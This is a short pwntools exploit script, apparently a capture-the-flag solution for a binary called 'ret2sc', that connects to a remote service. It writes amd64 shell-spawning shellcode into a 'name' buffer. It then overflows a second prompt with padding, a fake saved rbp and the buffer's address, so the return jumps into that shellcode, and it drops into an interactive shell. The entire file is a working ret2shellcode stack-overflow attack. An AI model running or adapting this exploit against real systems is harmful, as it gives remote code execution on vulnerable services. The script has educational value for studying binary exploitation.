#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./ret2sc"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 2122)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    c
    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

rbp = 0x123
c.sendlineafter('Name:',  asm(pwnlib.shellcraft.amd64.linux.sh()))
c.sendlineafter('best:',  b'a' * 0x20 + p64(rbp) + p64(elf.symbols['name']))

c.interactive()
c.close()
